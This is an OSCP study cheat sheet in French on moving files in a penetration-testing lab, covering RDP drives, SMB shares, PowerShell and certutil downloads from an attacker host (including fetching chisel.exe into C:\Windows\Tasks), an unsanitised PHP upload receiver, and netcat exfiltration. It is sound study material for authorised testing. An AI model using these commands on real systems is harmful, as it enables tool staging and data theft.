---
title: "OSCP · Transfert de fichiers"
description: "Envoyer, récupérer et encoder des fichiers dans un laboratoire."
---

# OSCP · Transfert de fichiers

Envoyer, récupérer et encoder des fichiers dans un laboratoire.


## Dossier partagé RDP


Commande `xfreerdp` pour la rubrique « Dossier partagé RDP ».

```bash
xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
```


Commande `rdesktop` pour la rubrique « Dossier partagé RDP ».

```bash
rdesktop -z -P -x m -u [user] -p [password] [IP] -r disk:test=/home/[your_username]/Desktop
```


**Paramètres et repères :**
`lget` · `lput`  


Commande `download` pour la rubrique « Dossier partagé RDP ».

```text
download [file_name] [optional_file_destination_path]
```


Commande `upload` pour la rubrique « Dossier partagé RDP ».

```text
upload [file_name] [optional_file_destination_path]
```


## FTP

Transférer ou récupérer des fichiers dans le laboratoire.


**Paramètres et repères :**
`binary`  


## SMB

Examiner les objets, les droits et les services du domaine.


Commande `impacket-smbserver` pour la rubrique « SMB ».

```bash
impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_user -password my_password
```


Commande `net` pour la rubrique « SMB ».

```bash
net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password
```


## Requêtes HTTP

Examiner les entrées et les réponses de l'application web.


Commande `python3` pour la rubrique « Requêtes HTTP ».

```powershell
python3 -m http.server 80

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
```


Exemple technique pour la rubrique « Requêtes HTTP ».

```bash
# From PowerShell
(New-Object System.Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')

Invoke-WebRequest -Uri http://[kali_IP]/[file_to_download] -OutFile [output_file_name]

# If iwr does not work 
certutil -urlcache -split -f http://[kali_IP]/[file_to_download]

# From CMD
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')"
```


## PHP Script (bring files from Windows)

Examiner les entrées et les réponses de l'application web.


**Paramètres et repères :**
`upload.php`  


Exemple technique pour la rubrique « PHP Script (bring files from Windows) ».

```php
<?php
  $uploaddir = '/var/www/uploads/';

  $uploadfile = $uploaddir . $_FILES['file']['name'];

  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```


**Paramètres et repères :**
`var/www/uploads`  


Commande `chmod` pour la rubrique « PHP Script (bring files from Windows) ».

```bash
chmod +x upload.php

sudo mkdir /var/www/uploads

mv upload.php /var/www/uploads
```


Commande `service` pour la rubrique « PHP Script (bring files from Windows) ».

```bash
service apache2 start

ps -ef | grep apache
```


Commande `powershell` pour la rubrique « PHP Script (bring files from Windows) ».

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
```


Commande `service` pour la rubrique « PHP Script (bring files from Windows) ».

```bash
service apache2 stop
```


## Netcat

Vérifier les ports et les services de la cible autorisée.


### Envoyer un fichier


Ouvrir un port d'écoute avec Netcat.

```bash
nc -lvp 4444 > received_file.txt

# (Optional) If we need to transfer the files over an encrypted connection just attach the --ssl option
ncat --ssl -lvp 4444 > received_file.txt
```


Tester ou établir une connexion réseau avec Netcat.

```bash
nc <receiver_IP> 4444 < file_to_send.txt

# (Optional) If we need to receive the files over an encrypted connection just attach the --ssl option
ncat --ssl <receiver_IP> 4444 < file_to_send.txt
```


### Send a File with Compression


Ouvrir un port d'écoute avec Netcat.

```bash
nc -lvp 4444 | tar xzvf -
```


Commande `tar` pour la rubrique « Send a File with Compression ».

```bash
tar czvf - file_or_folder_to_send | nc <receiver_IP> 4444
```


### Transferring Base64 via Copy and Paste

Transférer ou récupérer des fichiers dans le laboratoire.


Commande `base64` pour la rubrique « Transferring Base64 via Copy and Paste ».

```bash
# This will print the Base64 string directly in the terminal, which you can copy manually
base64 file_to_send.txt
```


Commande `echo` pour la rubrique « Transferring Base64 via Copy and Paste ».

```bash
# You can manually paste the Base64-encoded content into a new file
echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
```


### Transferring Base64 Contents via Netcat

Vérifier les ports et les services de la cible autorisée.


Ouvrir un port d'écoute avec Netcat.

```bash
nc -lvp 4444 | base64 -d > received_file.txt
```


Commande `base64` pour la rubrique « Transferring Base64 Contents via Netcat ».

```bash
base64 file_to_send.txt | nc <receiver_IP> 4444
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
